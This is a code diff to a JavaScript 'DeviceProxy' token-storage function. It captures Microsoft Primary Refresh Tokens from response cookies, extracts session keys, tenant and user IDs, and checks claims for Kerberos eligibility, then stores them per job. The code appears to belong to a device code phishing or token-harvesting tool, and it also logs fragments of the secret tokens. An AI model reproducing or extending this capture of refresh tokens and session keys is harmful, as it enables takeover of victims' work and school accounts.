@@ -411,35 +411,62 @@ async function storeToken(job, tokenData, responseCookies = []) {
     let deviceTenantId = null;
     let clientInfo = null;
 
-    // For device code flow, refresh_token is the PRT for work/school accounts
-    if (tokenData.refresh_token) {
+    // Preserve the PRT from the x-ms-RefreshTokenCredential cookie (if present)
+    // This is a JWT that can be decoded for client_info, session_key, tid, uid
+    const prtCookie = responseCookies.find(c => c.name === 'x-ms-RefreshTokenCredential');
+    if (prtCookie && prtCookie.value) {
+      prt = prtCookie.value;
+      console.log('[DeviceProxy] PRT from cookie: prefix=' + (prtCookie.value || '').substring(0, 30) + '... length=' + (prtCookie.value || '').length);
+    }
+
+    // If no PRT cookie, fall back to OAuth refresh token (but don't overwrite cookie PRT)
+    if (!prt && tokenData.refresh_token) {
       prt = tokenData.refresh_token;
+      console.log('[DeviceProxy] Using OAuth refresh_token as PRT fallback: prefix=' + (prt || '').substring(0, 30) + '...');
     }
 
     // Extract session_key_enc from token response (if present)
     if (tokenData.session_key_enc) {
       sessionKeyJwe = tokenData.session_key_enc;
+      console.log('[DeviceProxy] session_key_enc from token response');
     }
 
-    // Extract device_tenant_id from client_info in token response
+    // Extract client_info from token response (base64-encoded JSON with uid/utid)
     if (tokenData.client_info) {
       try {
         const clientInfoParsed = JSON.parse(Buffer.from(tokenData.client_info, 'base64').toString());
         deviceTenantId = clientInfoParsed.utid || null;
         clientInfo = tokenData.client_info;
+        console.log('[DeviceProxy] client_info from token response, deviceTenantId=' + deviceTenantId);
+      } catch (e) { /* ignore */ }
+    }
+
+    // Fallback: extract client_info from id_token JWT payload
+    if (!clientInfo && tokenData.id_token) {
+      try {
+        const idTokenClaims = parsePrtClaims(tokenData.id_token);
+        if (idTokenClaims && idTokenClaims.hasOwnProperty('tid')) {
+          deviceTenantId = idTokenClaims.tid || deviceTenantId;
+          // Build a synthetic client_info from id_token claims
+          clientInfo = JSON.stringify({
+            uid: idTokenClaims.oid || idTokenClaims.sub || '',
+            utid: idTokenClaims.tid || ''
+          });
+          console.log('[DeviceProxy] Extracted client_info from id_token (tid=' + idTokenClaims.tid + ', oid=' + idTokenClaims.oid + ')');
+        }
       } catch (e) { /* ignore */ }
     }
 
     // Decode PRT JWT from Set-Cookie headers (x-ms-RefreshTokenCredential)
     // The PRT JWT contains: client_info, session_key, id_token, tid, uid
-    try {
-      const prtCookie = responseCookies.find(c => c.name === 'x-ms-RefreshTokenCredential');
-      if (prtCookie && prtCookie.value) {
+    if (prtCookie && prtCookie.value) {
+      try {
         const prtClaims = parsePrtClaims(prtCookie.value);
         if (prtClaims) {
           // Extract client_info from PRT JWT (higher priority than token response)
           if (prtClaims.client_info && !clientInfo) {
             clientInfo = prtClaims.client_info;
+            console.log('[DeviceProxy] client_info from PRT JWT');
           }
           // Extract device_tenant_id from PRT JWT client_info
           if (prtClaims.client_info) {
@@ -451,11 +478,18 @@ async function storeToken(job, tokenData, responseCookies = []) {
           // Extract session_key from PRT JWT (overrides session_key_enc from token response)
           if (prtClaims.session_key) {
             sessionKeyJwe = prtClaims.session_key;
+            console.log('[DeviceProxy] session_key from PRT JWT');
           }
+          // Log acrs claim for Kerberos eligibility check
+          if (Array.isArray(prtClaims.acrs)) {
+            console.log('[DeviceProxy] PRT acrs claims: ' + JSON.stringify(prtClaims.acrs) + ' (pfdr=' + prtClaims.acrs.includes('pfdr') + ')');
+          }
+        } else {
+          console.log('[DeviceProxy] PRT JWT parse failed (not a JWT format): prefix=' + (prtCookie.value || '').substring(0, 30) + '...');
         }
+      } catch (e) {
+        console.log('[DeviceProxy] Failed to decode PRT JWT:', e.message);
       }
-    } catch (e) {
-      console.log('[DeviceProxy] Failed to decode PRT JWT:', e.message);
     }
 
     // Determine account type from email domain (must be before INSERT)
